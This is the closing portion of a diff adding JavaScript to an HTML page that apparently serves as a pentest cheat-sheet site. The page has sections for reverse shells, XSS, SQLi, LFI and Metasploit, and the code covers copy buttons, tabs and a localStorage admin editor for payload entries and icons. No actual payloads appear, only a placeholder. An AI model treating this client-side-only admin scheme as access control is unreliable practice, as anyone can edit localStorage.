+  navigator.clipboard.writeText(t).then(()=>{
+    const hdr=el.closest('.cb')?.querySelector('.cpbtn');
+    if(hdr){const old=hdr.textContent;hdr.textContent='copied!';hdr.classList.add('ok');setTimeout(()=>{hdr.textContent=old;hdr.classList.remove('ok');},1400);}
+  });
+}
+function switchTab(el,containerid,paneid){
+  const con=document.getElementById(containerid);
+  con.querySelectorAll('.tpane').forEach(p=>p.classList.remove('on'));
+  document.getElementById(paneid).classList.add('on');
+  const nav=el.closest('.tab-nav');
+  nav.querySelectorAll('.tb').forEach(b=>b.classList.remove('on'));
+  el.classList.add('on');
+}
+
+// ─── ADMIN PANEL ───
+function adSec(id){
+  document.querySelectorAll('.adm-s').forEach(s=>s.classList.remove('on'));
+  document.getElementById(id).classList.add('on');
+  document.querySelectorAll('.adm-nav').forEach(n=>n.classList.toggle('on',n.dataset.s===id));
+}
+function flash(id){
+  const el=document.getElementById('sv-'+id);
+  if(!el)return;
+  el.classList.add('show');
+  setTimeout(()=>el.classList.remove('show'),2000);
+}
+function saveField(fieldId,inputId,flashId){
+  const val=document.getElementById(inputId).value;
+  localStorage.setItem('nufyl_'+fieldId,val);
+  document.getElementById(fieldId).textContent=val;
+  flash(flashId);
+}
+function savePageMeta(page,flashId){
+  const t=document.getElementById('adm-'+page+'-title')?.value;
+  const d=document.getElementById('adm-'+page+'-desc')?.value;
+  if(t){localStorage.setItem('nufyl_'+page+'_title',t);const el=document.getElementById(page+'-title');if(el)el.textContent=t;}
+  if(d){localStorage.setItem('nufyl_'+page+'_desc',d);const el=document.getElementById(page+'-desc');if(el)el.textContent=d;}
+  flash(flashId);
+}
+function loadContent(){
+  // home desc
+  const hd=localStorage.getItem('nufyl_home-desc');if(hd){document.getElementById('home-desc').textContent=hd;}
+  // page metas
+  ['shells','payloads','php','lfi','xss','sqli','linux','windows','encoding','msf','tty'].forEach(p=>{
+    const t=localStorage.getItem('nufyl_'+p+'_title');
+    const d=localStorage.getItem('nufyl_'+p+'_desc');
+    if(t){const el=document.getElementById(p+'-title');if(el)el.textContent=t;}
+    if(d){const el=document.getElementById(p+'-desc');if(el)el.textContent=d;}
+  });
+  // payloads
+  const sp=localStorage.getItem('nufyl_payloads');
+  if(sp){try{PAYLOADS=JSON.parse(sp);}catch(e){}}
+  // icons
+  TOOLS.forEach(t=>{
+    const ic=localStorage.getItem('icon_'+t.id);
+    if(ic){
+      const ni=document.getElementById('ni-'+t.id);
+      if(ni)ni.textContent=ic;
+    }
+  });
+  // api key
+  loadApiKey();
+}
+function loadAdminData(){
+  // populate admin fields
+  const hd=localStorage.getItem('nufyl_home-desc');
+  if(hd){const el=document.getElementById('adm-home-desc');if(el)el.value=hd;}
+  ['shells','payloads','php','lfi','xss','sqli','linux','windows','encoding','msf','tty'].forEach(p=>{
+    const t=localStorage.getItem('nufyl_'+p+'_title');
+    const d=localStorage.getItem('nufyl_'+p+'_desc');
+    const te=document.getElementById('adm-'+p+'-title');
+    const de=document.getElementById('adm-'+p+'-desc');
+    const pt=document.getElementById(p+'-title');
+    const pd=document.getElementById(p+'-desc');
+    if(te&&t)te.value=t;else if(te&&pt)te.value=pt.textContent;
+    if(de&&d)de.value=d;else if(de&&pd)de.value=pd.textContent;
+  });
+  buildPayloadEditor();
+  buildIconEditor();
+}
+
+// payload editor
+function buildPayloadEditor(){
+  const list=document.getElementById('ple-list');
+  list.innerHTML=PAYLOADS.map((p,i)=>`
+    <div class="ple-item" data-i="${i}">
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;">
+        <div class="ef"><label>title</label><input type="text" value="${escHtml(p.title)}" data-f="title"></div>
+        <div class="ef"><label>category</label><input type="text" value="${escHtml(p.cat)}" data-f="cat"></div>
+      </div>
+      <div class="ef"><label>code</label><textarea data-f="code" style="min-height:60px;">${escHtml(p.code)}</textarea></div>
+      <div style="display:grid;grid-template-columns:1fr auto;gap:8px;align-items:end;">
+        <div class="ef" style="margin:0"><label>description</label><input type="text" value="${escHtml(p.desc)}" data-f="desc"></div>
+        <button class="del-btn" onclick="deletePayload(${i})">delete</button>
+      </div>
+      <div class="ef" style="margin-top:.5rem;"><label>tags (comma separated)</label><input type="text" value="${p.tags.join(',')}" data-f="tags"></div>
+    </div>`).join('');
+}
+function escHtml(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');}
+function collectPayloads(){
+  const items=document.querySelectorAll('.ple-item');
+  return Array.from(items).map(item=>{
+    const get=f=>item.querySelector(`[data-f="${f}"]`).value;
+    return{title:get('title'),cat:get('cat'),code:get('code'),desc:get('desc'),tags:get('tags').split(',').map(t=>t.trim()).filter(Boolean)};
+  });
+}
+function savePayloads(){PAYLOADS=collectPayloads();localStorage.setItem('nufyl_payloads',JSON.stringify(PAYLOADS));flash('payloads');}
+function addPayload(){
+  PAYLOADS.push({title:'New payload',cat:'xss',tags:['web'],code:'payload here',desc:'description'});
+  buildPayloadEditor();
+}
+function deletePayload(i){PAYLOADS.splice(i,1);buildPayloadEditor();}
+
+// icon editor
+const ICON_OPTIONS=['🐚','💉','🐘','📁','⚡','🗄️','🐧','🪟','🔐','💀','🖥️','🔥','🎯','🕵️','🔑','🛡️','⚔️','🧪','🔩','💣','🕸️','🧲','📡','🔓','🔒','👾','🤖','🐉','🦊','🐺','💎','🪤','🪝','🧨','🎲'];
+function buildIconEditor(){
+  const container=document.getElementById('icon-editor');
+  container.innerHTML=TOOLS.map(t=>`
+    <div class="ef">
+      <label>${t.name} icon</label>
+      <div style="display:flex;align-items:center;gap:10px;margin-bottom:6px;">
+        <span id="preview-icon-${t.id}" style="font-size:22px;">${getSavedIcon(t.id,t.icon)}</span>
+        <span style="font-size:11px;color:var(--muted);">current</span>
+      </div>
+      <div class="icon-grid" id="ig-${t.id}">
+        ${ICON_OPTIONS.map(ic=>`<span class="ic-o${getSavedIcon(t.id,t.icon)===ic?' sel':''}" onclick="selectIcon('${t.id}','${ic}')">${ic}</span>`).join('')}
+      </div>
+    </div>`).join('');
+}
+function selectIcon(page,icon){
+  localStorage.setItem('icon_'+page,icon);
+  document.getElementById('preview-icon-'+page).textContent=icon;
+  document.querySelectorAll(`#ig-${page} .ic-o`).forEach(o=>{o.classList.toggle('sel',o.textContent===icon);});
+  const ni=document.getElementById('ni-'+page);if(ni)ni.textContent=icon;
+  buildHomeGrid();
+}
+</script>
 </body>
 </html>
+ENDOFFILE
+echo "Done"
